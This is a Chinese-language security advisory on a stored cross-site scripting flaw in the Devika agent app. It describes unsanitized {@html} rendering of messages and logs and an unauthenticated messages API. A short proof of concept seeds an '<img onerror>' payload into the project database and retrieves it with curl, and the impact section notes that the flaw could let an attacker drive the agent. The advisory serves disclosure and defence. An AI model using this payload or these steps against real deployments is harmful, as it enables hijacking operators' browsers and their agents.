# Devika：存储型 XSS——消息/日志经 {@html} 未净化渲染

## 描述

前端两处渲染 sink 均绕过净化：`MessageContainer.svelte:62-73` 用 `bind:innerHTML`/`{@html}` 渲染消息，日志页 `+page.svelte:46-58` 用 `{@html log}` 渲染日志。项目仅在发送框出站方向使用 DOMPurify，存储/入站方向完全没有净化。后端 `POST /api/messages`（devika.py:68-73）把存储的消息原样返回，注入的 HTML 原文回传。

## 影响

Agent 处理的网页内容或 socket 提交的用户消息携带 `<img src=x onerror=...>` 等标记时被原样存储，任何查看该会话/日志的浏览器执行脚本——在操作者浏览器上下文里执行任意 JS（配合无认证 API 可完全驱动本地 Devika 实例）。

## PoC

```bash
# 1. 种子：受害者项目中存储含 payload 的消息（写 Projects.message_stack_json，
#    与 socket 'user-message' 处理器写入的路径相同）
python -c "
import sys, json; sys.path.insert(0, '.')
from sqlmodel import Session
from src.project import ProjectManager, Projects
mgr = ProjectManager()
with Session(mgr.engine) as s:
    row = Projects(project='xss-fresh-42',
                   message_stack_json=json.dumps([{'role':'user','message':'<img src=x onerror=alert(1)>'}]))
    s.add(row); s.commit()"

# 2. 未认证读取——payload 原样返回：
curl -X POST http://127.0.0.1:1337/api/messages -H "Content-Type: application/json" \
  -d '{"project_name": "xss-fresh-42"}'
```

## 执行结果

```
$ curl -X POST .../api/messages -d '{"project_name": "xss-fresh-42"}'
{"messages":[{"message":"<img src=x onerror=alert(1)>","role":"user"}]}
[HTTP 200]

前端 sink（代码级核实）：
  MessageContainer.svelte:62-73  bind:innerHTML / {@html}
  +page.svelte:46-58             {@html log}
  DOMPurify 仅用于发送框出站，不覆盖存储/入站渲染
```
